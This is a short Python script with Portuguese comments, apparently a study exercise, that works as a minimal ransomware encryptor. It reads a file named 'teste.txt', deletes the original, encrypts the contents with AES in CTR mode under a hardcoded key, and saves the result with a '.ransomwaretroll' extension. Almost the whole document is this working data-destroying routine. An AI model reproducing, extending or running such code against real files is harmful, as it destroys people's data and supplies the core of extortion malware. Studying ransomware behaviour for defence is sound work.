import os
import pyaes

## Abrir o arquivo a ser criptografado

nome_arquivo  = 'teste.txt'
arquivo = open(nome_arquivo, 'rb')
dados_arquivo = arquivo.read()
arquivo.close()

## Removendo arquivo original

os.remove(nome_arquivo)

## Definindo a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografando

dado_encriptado = aes.encrypt(dados_arquivo)

## Salvando arquivo criptografado

novo_arquivo = nome_arquivo + '.ransomwaretroll'
novo_arquivo = open(f'{novo_arquivo}', 'wb')
novo_arquivo.write(dado_encriptado)
novo_arquivo.close()
